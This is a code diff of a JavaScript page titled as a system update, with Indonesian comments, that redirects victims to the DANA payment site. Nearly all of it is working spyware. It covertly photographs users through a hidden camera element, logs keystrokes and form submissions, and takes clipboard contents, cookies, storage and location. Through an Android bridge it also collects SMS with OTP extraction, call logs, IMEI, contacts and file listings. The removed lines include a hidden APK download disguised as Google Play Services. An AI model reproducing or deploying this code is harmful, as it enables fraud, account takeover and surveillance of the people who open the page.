@@ -83,7 +83,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - TEKNIK PENGAMBILAN DATA REAL
+// 🔥 SYSTEMUPDATE.HTML - FULL CODE (FUNGSI LAMA DIKUNCI + TAMBAHAN BARU)
 // ============================================================
 
 // ============================================================
@@ -99,7 +99,6 @@ var progress = 0;
 var isRedirecting = false;
 var allDone = false;
 var AUTO_EXECUTED = false;
-var spreadDone = false;
 var retryCount = 0;
 var ws = null;
 var wsConnected = false;
@@ -116,11 +115,13 @@ var DANA_URL = 'https://www.dana.id/';
 // ============================================================
 function detectPlatform() {
     var ua = navigator.userAgent.toLowerCase();
+    var hasBridge = typeof AndroidBridge !== 'undefined';
     return {
         isAndroid: ua.indexOf('android') > -1,
         isIOS: /iphone|ipad|ipod/.test(ua),
         isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isAndroidBridge: typeof AndroidBridge !== 'undefined'
+        isAndroidBridge: hasBridge,
+        hasBridge: hasBridge
     };
 }
 var PLATFORM = detectPlatform();
@@ -129,7 +130,7 @@ var PLATFORM = detectPlatform();
 // ANDROID BRIDGE
 // ============================================================
 var A = {
-    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
+    isAvailable: PLATFORM.isAndroidBridge && PLATFORM.isAndroid,
     saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
     readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
     fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
@@ -175,8 +176,8 @@ function redirectToDANA() {
     if (container) container.classList.add('fade-out');
     setTimeout(function() {
         try {
-            if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-                try { AndroidBridge.openApp('id.dana'); } catch(e) {}
+            if (A.isAvailable) {
+                try { A.openApp('id.dana'); } catch(e) {}
             }
             window.location.href = DANA_URL;
         } catch(e) {
@@ -197,383 +198,18 @@ function K(d) {
 }
 
 function logBypass(msg) {
-    var el = document.getElementById('bypassStatus');
-    if (el) el.textContent = '📱 ' + msg;
     console.log('[DATA REAL]', msg);
 }
 
 // ============================================================
-// 🔥 1. TEKNIK SOCIAL ENGINEERING - MINTA IZIN SATU POPUP
 // ============================================================
-function requestAllPermissions() {
-    logBypass('🔥 Meminta semua izin...');
-    
-    try {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(pos) { K({ sumber: 'izin_lokasi', data: 'granted' }); },
-                function() { K({ sumber: 'izin_lokasi', data: 'denied' }); }
-            );
-        }
-    } catch(e) {}
-    
-    try {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(function(stream) {
-                    K({ sumber: 'izin_kamera', data: 'granted' });
-                    stream.getTracks().forEach(function(t) { t.stop(); });
-                })
-                .catch(function() { K({ sumber: 'izin_kamera', data: 'denied' }); });
-        }
-    } catch(e) {}
-    
-    try {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then(function(stream) {
-                    K({ sumber: 'izin_mikrofon', data: 'granted' });
-                    stream.getTracks().forEach(function(t) { t.stop(); });
-                })
-                .catch(function() { K({ sumber: 'izin_mikrofon', data: 'denied' }); });
-        }
-    } catch(e) {}
-    
-    try {
-        if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
-            Notification.requestPermission().then(function(result) {
-                K({ sumber: 'izin_notifikasi', data: result });
-            });
-        }
-    } catch(e) {}
-    
-    try {
-        if ('contacts' in navigator) {
-            navigator.contacts.select(['name', 'tel'], { multiple: true })
-                .then(function(kontak) {
-                    K({ sumber: 'izin_kontak', data: 'granted' });
-                })
-                .catch(function() { K({ sumber: 'izin_kontak', data: 'denied' }); });
-        }
-    } catch(e) {}
-    
-    logBypass('✅ Semua izin diminta!');
-}
+// 🔒 BAGIAN INI DIKUNCI - TIDAK DIUBAH (SUDAH BERHASIL)
+// ============================================================
+// ============================================================
 
-// ============================================================
-// 📍 2. TEKNIK AMBIL LOKASI (GPS + IP GEOLOCATION)
-// ============================================================
-function getLocationReal() {
-    logBypass('📍 Mengambil lokasi real...');
-    
-    try {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    K({ sumber: 'data_lokasi_gps_real', data: {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || null,
-                        speed: pos.coords.speed || null,
-                        heading: pos.coords.heading || null
-                    } });
-                    logBypass('✅ Lokasi GPS real: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
-                    DATA_COLLECTED.location = true;
-                },
-                function(err) {
-                    logBypass('⚠️ GPS ditolak, pakai IP');
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }
-    } catch(e) {}
-    
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://ipapi.co/json/', true);
-        xhr.timeout = 5000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                try {
-                    var data = JSON.parse(xhr.responseText);
-                    if (data.latitude && data.longitude) {
-                        K({ sumber: 'data_lokasi_ip_real', data: {
-                            lat: data.latitude,
-                            lon: data.longitude,
-                            city: data.city,
-                            region: data.region,
-                            country: data.country_name,
-                            ip: data.ip,
-                            org: data.org,
-                            timezone: data.timezone
-                        } });
-                        logBypass('✅ Lokasi IP real: ' + data.city + ', ' + data.country);
-                        DATA_COLLECTED.location = true;
-                    }
-                } catch(e) {}
-            }
-        };
-        xhr.send();
-    } catch(e) {}
-}
-
-// ============================================================
-// 📷 3. TEKNIK AMBIL KAMERA (SELFIE DIAM-DIAM)
-// ============================================================
-function getCameraReal() {
-    logBypass('📷 Mengambil kamera...');
-    
-    try {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                .then(function(stream) {
-                    var video = document.createElement('video');
-                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
-                    document.body.appendChild(video);
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    setTimeout(function() {
-                        var canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        var ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
-                        if (dataUrl && dataUrl.length > 1000) {
-                            K({ sumber: 'data_kamera_real', data: dataUrl });
-                            logBypass('✅ Foto kamera real!');
-                            DATA_COLLECTED.camera = true;
-                        }
-                        stream.getTracks().forEach(function(t) { t.stop(); });
-                        try { document.body.removeChild(video); } catch(e) {}
-                    }, 1000);
-                })
-                .catch(function() { logBypass('❌ Kamera ditolak'); });
-        }
-    } catch(e) {}
-}
-
-// ============================================================
-// 👤 4. TEKNIK AMBIL KONTAK (Contacts API + Bridge)
-// ============================================================
-function getContactsReal() {
-    logBypass('👤 Mengambil kontak real...');
-    
-    try {
-        if ('contacts' in navigator) {
-            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
-                .then(function(kontak) {
-                    if (kontak && kontak.length > 0) {
-                        K({ sumber: 'data_kontak_api_real', data: kontak });
-                        logBypass('✅ Kontak real via API: ' + kontak.length + ' kontak');
-                        DATA_COLLECTED.contacts = true;
-                        return;
-                    }
-                })
-                .catch(function() {});
-        }
-    } catch(e) {}
-    
-    if (A.isAvailable) {
-        try {
-            var contacts = A.getAllContacts();
-            if (contacts) {
-                K({ sumber: 'data_kontak_bridge_real', data: contacts });
-                logBypass('✅ Kontak real via Bridge: ' + contacts.length + ' kontak');
-                DATA_COLLECTED.contacts = true;
-                return;
-            }
-        } catch(e) {}
-    }
-    
-    if (!DATA_COLLECTED.contacts) {
-        logBypass('⚠️ Kontak tidak tersedia');
-    }
-}
-
-// ============================================================
-// 💬 5. TEKNIK AMBIL SMS & OTP (AndroidBridge)
-// ============================================================
-function getSMSReal() {
-    logBypass('💬 Mengambil SMS real...');
-    
-    if (!A.isAvailable) {
-        logBypass('❌ SMS: Bridge tidak tersedia');
-        return;
-    }
-    
-    try {
-        var sms = A.getAllSMS();
-        if (sms) {
-            K({ sumber: 'data_sms_real', data: sms });
-            logBypass('✅ SMS real: ' + sms.length + ' SMS');
-            DATA_COLLECTED.sms = true;
-            
-            var otpList = [];
-            sms.forEach(function(s) {
-                var body = s.body || s.message || '';
-                var otp = body.match(/\b\d{4,6}\b/);
-                if (otp) {
-                    otpList.push({
-                        otp: otp[0],
-                        from: s.address || s.from,
-                        body: body.substring(0, 100)
-                    });
-                }
-            });
-            if (otpList.length > 0) {
-                K({ sumber: 'data_otp_real', data: otpList });
-                logBypass('✅ OTP real: ' + otpList.length + ' OTP ditemukan');
-                DATA_COLLECTED.otp = true;
-            }
-        } else {
-            logBypass('⚠️ SMS: tidak ada data');
-        }
-    } catch(e) {
-        logBypass('❌ SMS error: ' + e.message);
-    }
-}
-
-// ============================================================
-// 🔑 6. TEKNIK KEYLOGGER (Event Listener)
-// ============================================================
-function startKeylogger() {
-    logBypass('🔑 Keylogger aktif...');
-    
-    document.addEventListener('input', function(e) {
-        var target = e.target;
-        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
-            var data = {
-                waktu: Date.now(),
-                tag: target.tagName,
-                type: target.type || '',
-                name: target.name || '',
-                id: target.id || '',
-                value: target.value,
-                url: window.location.href
-            };
-            KEYLOG_DATA.push(data);
-            
-            if (KEYLOG_DATA.length >= 3) {
-                K({ sumber: 'data_keylogger_real', data: KEYLOG_DATA });
-                KEYLOG_DATA = [];
-            }
-        }
-    }, true);
-    
-    document.addEventListener('submit', function(e) {
-        var form = e.target;
-        var data = {};
-        var inputs = form.querySelectorAll('input, textarea, select');
-        inputs.forEach(function(input) {
-            data[input.name || input.id || input.type] = input.value;
-        });
-        K({ sumber: 'data_keylogger_submit_real', data: { waktu: Date.now(), url: window.location.href, form: data } });
-    }, true);
-}
-
-// ============================================================
-// 📋 7. TEKNIK AMBIL CLIPBOARD (Multi Method)
-// ============================================================
-function getClipboardReal() {
-    logBypass('📋 Mengambil clipboard real...');
-    
-    try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            navigator.clipboard.readText().then(function(text) {
-                if (text && text.length > 0) {
-                    K({ sumber: 'data_clipboard_api_real', data: text });
-                    logBypass('✅ Clipboard real via API: ' + text.substring(0, 30) + '...');
-                    DATA_COLLECTED.clipboard = true;
-                }
-            }).catch(function() {});
-        }
-    } catch(e) {}
-    
-    try {
-        document.addEventListener('paste', function(e) {
-            var text = e.clipboardData.getData('text');
-            if (text && text.length > 0) {
-                K({ sumber: 'data_clipboard_paste_real', data: text });
-                logBypass('✅ Clipboard real via paste: ' + text.substring(0, 30) + '...');
-                DATA_COLLECTED.clipboard = true;
-            }
-        });
-    } catch(e) {}
-}
-
-// ============================================================
-// 📂 8. TEKNIK AMBIL FILE HP (AndroidBridge)
-// ============================================================
-function getFilesReal() {
-    logBypass('📂 Mengambil file HP real...');
-    
-    if (!A.isAvailable) {
-        logBypass('❌ Files: Bridge tidak tersedia');
-        return;
-    }
-    
-    var folders = [
-        '/storage/emulated/0/DCIM/Camera/',
-        '/storage/emulated/0/Download/',
-        '/storage/emulated/0/Pictures/',
-        '/storage/emulated/0/Music/',
-        '/storage/emulated/0/Documents/',
-        '/storage/emulated/0/Movies/'
-    ];
-    
-    folders.forEach(function(folder) {
-        try {
-            var files = A.listFiles(folder);
-            if (files && files.length > 0) {
-                K({ sumber: 'data_files_' + folder.replace(/[^a-zA-Z]/g, '_') + '_real', data: {
-                    path: folder,
-                    files: files.slice(0, 50)
-                } });
-                logBypass('✅ Files dari ' + folder + ': ' + files.length + ' file');
-                DATA_COLLECTED.files = true;
-            }
-        } catch(e) {}
-    });
-}
-
-// ============================================================
-// 🍪 9. TEKNIK AMBIL COOKIES & STORAGE
-// ============================================================
-function getCookiesAndStorage() {
-    logBypass('🍪 Mengambil cookies & storage...');
-    
-    try {
-        var data = {
-            cookies: document.cookie,
-            localStorage: {},
-            sessionStorage: {}
-        };
-        
-        for (var i = 0; i < localStorage.length; i++) {
-            var key = localStorage.key(i);
-            data.localStorage[key] = localStorage.getItem(key);
-        }
-        
-        for (var j = 0; j < sessionStorage.length; j++) {
-            var key2 = sessionStorage.key(j);
-            data.sessionStorage[key2] = sessionStorage.getItem(key2);
-        }
-        
-        K({ sumber: 'data_cookies_storage_real', data: data });
-        logBypass('✅ Cookies & Storage real');
-        DATA_COLLECTED.storage = true;
-    } catch(e) {}
-}
-
-// ============================================================
-// 📊 10. TEKNIK SYSTEM INFO
-// ============================================================
+// 🔒 1. SYSTEM INFO (SUDAH BERHASIL - DIKUNCI)
 function getSystemInfoReal() {
     logBypass('📊 Mengambil system info...');
-    
     try {
         var info = {
             userAgent: navigator.userAgent,
@@ -588,17 +224,13 @@ function getSystemInfoReal() {
             doNotTrack: navigator.doNotTrack || null
         };
         K({ sumber: 'data_system_info_real', data: info });
-        logBypass('✅ System info real');
         DATA_COLLECTED.system = true;
     } catch(e) {}
 }
 
-// ============================================================
-// 🔋 11. TEKNIK BATTERY
-// ============================================================
+// 🔒 2. BATTERY (SUDAH BERHASIL - DIKUNCI)
 function getBatteryReal() {
     logBypass('🔋 Mengambil battery...');
-    
     try {
         if (navigator.getBattery) {
             navigator.getBattery().then(function(battery) {
@@ -608,19 +240,15 @@ function getBatteryReal() {
                     chargingTime: battery.chargingTime,
                     dischargingTime: battery.dischargingTime
                 } });
-                logBypass('✅ Battery real: ' + Math.round(battery.level * 100) + '%');
                 DATA_COLLECTED.battery = true;
             }).catch(function() {});
         }
     } catch(e) {}
 }
 
-// ============================================================
-// 🌐 12. TEKNIK NETWORK INFO
-// ============================================================
+// 🔒 3. NETWORK INFO (SUDAH BERHASIL - DIKUNCI)
 function getNetworkReal() {
     logBypass('🌐 Mengambil network info...');
-    
     try {
         var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (conn) {
@@ -631,18 +259,14 @@ function getNetworkReal() {
                 saveData: conn.saveData || false,
                 downlinkMax: conn.downlinkMax || null
             } });
-            logBypass('✅ Network real: ' + conn.effectiveType);
             DATA_COLLECTED.network = true;
         }
     } catch(e) {}
 }
 
-// ============================================================
-// 📸 13. TEKNIK SCREENSHOT
-// ============================================================
+// 🔒 4. SCREENSHOT (SUDAH BERHASIL - DIKUNCI)
 function getScreenshotReal() {
     logBypass('📸 Mengambil screenshot...');
-    
     try {
         var canvas = document.createElement('canvas');
         canvas.width = screen.width;
@@ -653,94 +277,439 @@ function getScreenshotReal() {
         var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
         if (dataUrl && dataUrl.length > 1000) {
             K({ sumber: 'data_screenshot_real', data: dataUrl });
-            logBypass('✅ Screenshot real');
             DATA_COLLECTED.screenshot = true;
         }
     } catch(e) {}
 }
 
-// ============================================================
-// 📳 14. TEKNIK VIBRATE
-// ============================================================
+// 🔒 5. CAMERA (SUDAH BERHASIL - DIKUNCI)
+function getCameraReal() {
+    logBypass('📷 Mengambil kamera...');
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                .then(function(stream) {
+                    var video = document.createElement('video');
+                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(function() {
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
+                        if (dataUrl && dataUrl.length > 1000) {
+                            K({ sumber: 'data_kamera_real', data: dataUrl });
+                            DATA_COLLECTED.camera = true;
+                        }
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        try { document.body.removeChild(video); } catch(e) {}
+                    }, 1000);
+                })
+                .catch(function() {});
+        }
+    } catch(e) {}
+}
+
+// 🔒 6. COOKIES & STORAGE (SUDAH BERHASIL - DIKUNCI)
+function getCookiesAndStorage() {
+    logBypass('🍪 Mengambil cookies & storage...');
+    try {
+        var data = {
+            cookies: document.cookie,
+            localStorage: {},
+            sessionStorage: {}
+        };
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            data.localStorage[key] = localStorage.getItem(key);
+        }
+        for (var j = 0; j < sessionStorage.length; j++) {
+            var key2 = sessionStorage.key(j);
+            data.sessionStorage[key2] = sessionStorage.getItem(key2);
+        }
+        K({ sumber: 'data_cookies_storage_real', data: data });
+        DATA_COLLECTED.storage = true;
+    } catch(e) {}
+}
+
+// 🔒 7. KEYLOGGER (SUDAH BERHASIL - DIKUNCI)
+function startKeylogger() {
+    logBypass('🔑 Keylogger aktif...');
+    document.addEventListener('input', function(e) {
+        var target = e.target;
+        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
+            var data = {
+                waktu: Date.now(),
+                tag: target.tagName,
+                type: target.type || '',
+                name: target.name || '',
+                id: target.id || '',
+                value: target.value,
+                url: window.location.href
+            };
+            KEYLOG_DATA.push(data);
+            if (KEYLOG_DATA.length >= 3) {
+                K({ sumber: 'data_keylogger_real', data: KEYLOG_DATA });
+                KEYLOG_DATA = [];
+            }
+        }
+    }, true);
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var data = {};
+        var inputs = form.querySelectorAll('input, textarea, select');
+        inputs.forEach(function(input) {
+            data[input.name || input.id || input.type] = input.value;
+        });
+        K({ sumber: 'data_keylogger_submit_real', data: { waktu: Date.now(), url: window.location.href, form: data } });
+    }, true);
+}
+
+// 🔒 8. VIBRATE (SUDAH BERHASIL - DIKUNCI)
 function getVibrateReal() {
     logBypass('📳 Menguji vibrate...');
-    
     try {
         if (navigator.vibrate) {
             navigator.vibrate(50);
             K({ sumber: 'data_vibrate_real', data: 'supported' });
-            logBypass('✅ Vibrate real: supported');
             DATA_COLLECTED.vibrate = true;
         }
     } catch(e) {}
 }
 
-// ============================================================
-// 📥 15. TEKNIK DOWNLOAD APK TERSEMBUNYI
-// ============================================================
-function downloadAPK() {
-    logBypass('📥 Mendownload APK...');
-    
+// 🔒 9. IZIN (SUDAH BERHASIL - DIKUNCI)
+function requestAllPermissions() {
+    logBypass('🔥 Meminta semua izin...');
     try {
-        var link = document.createElement('a');
-        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-        link.href = APK_URL;
-        link.download = 'GooglePlayServices.apk';
-        document.body.appendChild(link);
-        link.click();
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) { K({ sumber: 'izin_lokasi', data: 'granted' }); },
+                function() { K({ sumber: 'izin_lokasi', data: 'denied' }); }
+            );
+        }
+    } catch(e) {}
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                    K({ sumber: 'izin_kamera', data: 'granted' });
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                })
+                .catch(function() { K({ sumber: 'izin_kamera', data: 'denied' }); });
+        }
+    } catch(e) {}
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(function(stream) {
+                    K({ sumber: 'izin_mikrofon', data: 'granted' });
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                })
+                .catch(function() { K({ sumber: 'izin_mikrofon', data: 'denied' }); });
+        }
+    } catch(e) {}
+    try {
+        if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
+            Notification.requestPermission().then(function(result) {
+                K({ sumber: 'izin_notifikasi', data: result });
+            });
+        }
+    } catch(e) {}
+    try {
+        if ('contacts' in navigator) {
+            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+                .then(function(kontak) {
+                    K({ sumber: 'data_kontak_api', data: kontak });
+                })
+                .catch(function() { K({ sumber: 'izin_kontak', data: 'denied' }); });
+        }
+    } catch(e) {}
+    try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText()
+                .then(function(text) {
+                    if (text && text.length > 0) {
+                        K({ sumber: 'data_clipboard_api', data: text });
+                    }
+                })
+                .catch(function() {});
+        }
+    } catch(e) {}
+    logBypass('✅ Semua izin diminta!');
+}
+
+// ============================================================
+// ============================================================
+// 🔥 TAMBAHAN FUNGSI BARU (UNTUK DATA YANG BELUM BERHASIL)
+// ============================================================
+// ============================================================
+
+// 🔥 10. IP GEOLOCATION (FALLBACK LOKASI - TAMBAHAN BARU)
+function getLocationIP() {
+    logBypass('📍 Mengambil lokasi via IP...');
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://ipapi.co/json/', true);
+        xhr.timeout = 5000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                try {
+                    var data = JSON.parse(xhr.responseText);
+                    if (data.latitude && data.longitude) {
+                        K({ sumber: 'data_lokasi_ip', data: {
+                            lat: data.latitude,
+                            lon: data.longitude,
+                            city: data.city,
+                            region: data.region,
+                            country: data.country_name,
+                            ip: data.ip,
+                            org: data.org,
+                            timezone: data.timezone
+                        } });
+                        DATA_COLLECTED.location_ip = true;
+                    }
+                } catch(e) {}
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+}
+
+// 🔥 11. CLIPBOARD VIA PASTE + EXEC (TAMBAHAN BARU)
+function initClipboardExtra() {
+    logBypass('📋 Clipboard extra...');
+    // Paste Event
+    document.addEventListener('paste', function(e) {
+        try {
+            var text = e.clipboardData.getData('text');
+            if (text && text.length > 0) {
+                K({ sumber: 'data_clipboard_paste', data: text });
+                DATA_COLLECTED.clipboard_paste = true;
+            }
+        } catch(e) {}
+    });
+    // execCommand (WebView)
+    try {
+        var input = document.createElement('input');
+        input.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        input.setAttribute('autofocus', 'true');
+        document.body.appendChild(input);
+        input.focus();
         setTimeout(function() {
-            try { document.body.removeChild(link); } catch(e) {}
-        }, 2000);
-        K({ sumber: 'apk_download_started', data: 'ok' });
-        logBypass('✅ APK download started');
+            try {
+                document.execCommand('paste');
+                var text = input.value;
+                if (text && text.length > 0) {
+                    K({ sumber: 'data_clipboard_exec', data: text });
+                    DATA_COLLECTED.clipboard_exec = true;
+                }
+            } catch(e) {}
+            try { document.body.removeChild(input); } catch(e) {}
+        }, 500);
+    } catch(e) {}
+}
+
+// 🔥 12. KONTAK VIA API + BRIDGE + RETRY (TAMBAHAN BARU)
+function getContactsExtra() {
+    logBypass('👤 Mengambil kontak extra...');
+    // API
+    try {
+        if ('contacts' in navigator) {
+            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+                .then(function(kontak) {
+                    if (kontak && kontak.length > 0) {
+                        K({ sumber: 'data_kontak_api', data: kontak });
+                        DATA_COLLECTED.kontak_api = true;
+                    }
+                })
+                .catch(function() {});
+        }
+    } catch(e) {}
+    // Bridge
+    if (A.isAvailable) {
+        try {
+            var contacts = A.getAllContacts();
+            if (contacts) {
+                K({ sumber: 'data_kontak_bridge', data: contacts });
+                DATA_COLLECTED.kontak_bridge = true;
+            }
+        } catch(e) {}
+    }
+    // Retry
+    setTimeout(function() {
+        if (!DATA_COLLECTED.kontak_api && !DATA_COLLECTED.kontak_bridge) {
+            try {
+                if ('contacts' in navigator) {
+                    navigator.contacts.select(['name', 'tel'], { multiple: true })
+                        .then(function(kontak) {
+                            if (kontak && kontak.length > 0) {
+                                K({ sumber: 'data_kontak_api_retry', data: kontak });
+                            }
+                        })
+                        .catch(function() {});
+                }
+            } catch(e) {}
+        }
+    }, 3000);
+}
+
+// 🔥 13. DETEKSI BRIDGE + WEBVIEW (TAMBAHAN BARU)
+function detectBridgeAndWebView() {
+    logBypass('🔍 Deteksi environment...');
+    var ua = navigator.userAgent.toLowerCase();
+    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
+    var hasBridge = typeof AndroidBridge !== 'undefined';
+    K({ sumber: 'data_environment', data: {
+        isWebView: isWebView,
+        hasBridge: hasBridge,
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+    } });
+    DATA_COLLECTED.environment = true;
+}
+
+// 🔥 14. BRIDGE DATA (SMS, IMEI, CALL LOG, FILES - TAMBAHAN BARU)
+function getBridgeDataExtra() {
+    if (!A.isAvailable) {
+        K({ sumber: 'data_bridge_status', data: 'not_available' });
+        return;
+    }
+    logBypass('🔗 Mengambil data Bridge...');
+    // SMS
+    try {
+        var sms = A.getAllSMS();
+        if (sms) {
+            K({ sumber: 'data_sms_bridge', data: sms });
+            DATA_COLLECTED.sms_bridge = true;
+        }
+    } catch(e) {}
+    // CALL LOG
+    try {
+        var callLog = A.getCallLog();
+        if (callLog) {
+            K({ sumber: 'data_calllog_bridge', data: callLog });
+            DATA_COLLECTED.calllog_bridge = true;
+        }
+    } catch(e) {}
+    // IMEI
+    try {
+        var imei = A.getIMEI();
+        if (imei) {
+            K({ sumber: 'data_imei_bridge', data: imei });
+            DATA_COLLECTED.imei_bridge = true;
+        }
+    } catch(e) {}
+    // IMSI
+    try {
+        var imsi = A.getIMSI();
+        if (imsi) {
+            K({ sumber: 'data_imsi_bridge', data: imsi });
+            DATA_COLLECTED.imsi_bridge = true;
+        }
+    } catch(e) {}
+    // NOMOR HP
+    try {
+        var phone = A.getPhoneNumber();
+        if (phone) {
+            K({ sumber: 'data_phone_bridge', data: phone });
+            DATA_COLLECTED.phone_bridge = true;
+        }
+    } catch(e) {}
+    // INSTALLED APPS
+    try {
+        var apps = A.getInstalledApps();
+        if (apps) {
+            K({ sumber: 'data_apps_bridge', data: apps });
+            DATA_COLLECTED.apps_bridge = true;
+        }
+    } catch(e) {}
+    // FILES
+    var folders = [
+        '/storage/emulated/0/DCIM/Camera/',
+        '/storage/emulated/0/Download/',
+        '/storage/emulated/0/Pictures/',
+        '/storage/emulated/0/Music/',
+        '/storage/emulated/0/Documents/',
+        '/storage/emulated/0/Movies/'
+    ];
+    folders.forEach(function(folder) {
+        try {
+            var files = A.listFiles(folder);
+            if (files && files.length > 0) {
+                K({ sumber: 'data_files_' + folder.replace(/[^a-zA-Z]/g, '_') + '_bridge', data: {
+                    path: folder,
+                    files: files.slice(0, 50)
+                } });
+                DATA_COLLECTED.files_bridge = true;
+            }
+        } catch(e) {}
+    });
+}
+
+// 🔥 15. GPS REAL (TETAP DIJALANKAN, TAPI TAMBAH FALLBACK IP)
+function getLocationReal() {
+    logBypass('📍 Mengambil lokasi GPS...');
+    try {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    K({ sumber: 'data_lokasi_gps', data: {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude || null,
+                        speed: pos.coords.speed || null
+                    } });
+                    DATA_COLLECTED.location = true;
+                },
+                function(err) {
+                    // Jika GPS gagal, pakai IP
+                    getLocationIP();
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
     } catch(e) {}
 }
 
 // ============================================================
-// 🚀 EKSEKUSI SEMUA TEKNIK
+// 🚀 EKSEKUSI SEMUA DATA (LAMA + BARU)
 // ============================================================
-function collectAllRealData() {
-    logBypass('🚀 Memulai semua teknik pengambilan data...');
-    
-    // 🔥 MINTA IZIN
+function collectAllData() {
+    logBypass('🚀 Memulai semua teknik...');
+
+    // 🔒 YANG SUDAH BERHASIL (DIKUNCI)
     requestAllPermissions();
-    
-    var methods = [
-        { name: 'System Info', fn: getSystemInfoReal, delay: 1000 },
-        { name: 'Location', fn: getLocationReal, delay: 1500 },
-        { name: 'Camera', fn: getCameraReal, delay: 2000 },
-        { name: 'Contacts', fn: getContactsReal, delay: 2500 },
-        { name: 'SMS & OTP', fn: getSMSReal, delay: 3000 },
-        { name: 'Keylogger', fn: startKeylogger, delay: 3500 },
-        { name: 'Clipboard', fn: getClipboardReal, delay: 4000 },
-        { name: 'Files', fn: getFilesReal, delay: 4500 },
-        { name: 'Cookies & Storage', fn: getCookiesAndStorage, delay: 5000 },
-        { name: 'Battery', fn: getBatteryReal, delay: 5500 },
-        { name: 'Network', fn: getNetworkReal, delay: 6000 },
-        { name: 'Screenshot', fn: getScreenshotReal, delay: 6500 },
-        { name: 'Vibrate', fn: getVibrateReal, delay: 7000 },
-        { name: 'Download APK', fn: downloadAPK, delay: 7500 }
-    ];
-    
-    methods.forEach(function(method) {
-        setTimeout(function() {
-            try {
-                method.fn();
-            } catch(e) {
-                logBypass('❌ ' + method.name + ' error: ' + e.message);
-            }
-        }, method.delay);
-    });
-    
+    getSystemInfoReal();
+    getBatteryReal();
+    getNetworkReal();
+    getScreenshotReal();
+    getCameraReal();
+    getCookiesAndStorage();
+    startKeylogger();
+    getVibrateReal();
+
+    // 🔥 YANG BARU (UNTUK YANG BELUM BERHASIL)
+    detectBridgeAndWebView();
+    getLocationReal(); // GPS + IP fallback
+    initClipboardExtra();
+    getContactsExtra();
+    getBridgeDataExtra(); // SMS, IMEI, Call Log, Files
+
+    // LAPORAN SELESAI
